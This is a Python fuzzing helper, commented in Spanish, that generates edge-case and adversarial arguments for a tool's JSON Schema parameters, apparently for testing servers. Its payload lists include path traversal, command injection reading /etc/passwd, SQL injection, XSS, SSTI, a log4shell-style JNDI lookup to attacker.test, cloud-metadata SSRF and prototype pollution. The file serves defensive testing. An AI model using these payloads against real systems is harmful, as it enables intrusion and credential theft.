"""
Genera valores adversariales/edge-case para un parámetro dado su tipo declarado
en el JSON Schema. No usa librerías de fuzzing pesadas para mantenerlo rápido
y 100% bajo nuestro control (payloads auditables).
"""
from __future__ import annotations

STRING_PAYLOADS = [
    "",                                    # vacío
    " " * 5000,                             # whitespace masivo
    "A" * 100000,                           # overflow / DoS de memoria
    "../../../../etc/passwd",               # path traversal
    "..\\..\\..\\windows\\win.ini",
    "; cat /etc/passwd; #",                 # command injection
    "$(cat /etc/passwd)",
    "`id`",
    "' OR '1'='1",                          # sql injection
    "1' UNION SELECT NULL--",
    "<script>alert(1)</script>",            # xss (si el output se renderiza en algún UI)
    "{{7*7}}",                              # SSTI
    "${jndi:ldap://attacker.test/a}",       # log4shell-style
    "http://169.254.169.254/latest/meta-data/",  # SSRF a metadata cloud
    "file:///etc/passwd",
    "\x00\x01\x02",                          # bytes de control / null byte injection
    "𝕥𝕖𝕩𝕥 con unicode raro \u202e reversed",  # bidi override
    None,                                    # tipo incorrecto
    12345,                                   # tipo incorrecto (int donde va string)
    True,                                    # tipo incorrecto (bool)
    ["array", "inesperado"],                 # tipo incorrecto
]

NUMBER_PAYLOADS = [0, -1, 2**63, -(2**63), 1.5e308, float("inf"), float("-inf"), "no_es_numero", None, -0.0000001]

BOOLEAN_PAYLOADS = ["true", "false", 1, 0, None, "yes"]

ARRAY_PAYLOADS = [[], [None] * 1000, "no_es_array", {"a": 1}, None]

OBJECT_PAYLOADS = [{}, {"__proto__": {"polluted": True}}, "no_es_objeto", None, {"a": {"b": {"c": {"d": "deep"}}}}]


def payloads_for_type(json_type: str) -> list:
    return {
        "string": STRING_PAYLOADS,
        "number": NUMBER_PAYLOADS,
        "integer": NUMBER_PAYLOADS,
        "boolean": BOOLEAN_PAYLOADS,
        "array": ARRAY_PAYLOADS,
        "object": OBJECT_PAYLOADS,
    }.get(json_type, STRING_PAYLOADS)


def build_fuzz_cases(schema: dict, max_cases: int = 25) -> list[dict]:
    """
    Dado el input_schema de un tool, genera una lista de argumentos completos
    (uno por caso de fuzz), mutando un parámetro a la vez y dejando el resto
    con un valor "válido" mínimo, para aislar qué parámetro rompe el server.
    """
    props = schema.get("properties", {}) or {}
    required = schema.get("required", []) or []
    cases = []

    def minimal_valid(pschema: dict):
        t = pschema.get("type", "string")
        if "enum" in pschema:
            return pschema["enum"][0]
        return {"string": "test", "number": 1, "integer": 1, "boolean": True, "array": [], "object": {}}.get(t, "test")

    baseline = {p: minimal_valid(s) for p, s in props.items() if p in required}

    for pname, pschema in props.items():
        ptype = pschema.get("type", "string")
        for payload in payloads_for_type(ptype):
            args = dict(baseline)
            args[pname] = payload
            cases.append(args)
            if len(cases) >= max_cases:
                return cases

    # caso extra: objeto vacío (sin required) y objeto con campo no declarado
    if not required:
        cases.append({})
    cases.append({**baseline, "__unexpected_field__": "injected"})

    return cases[:max_cases]
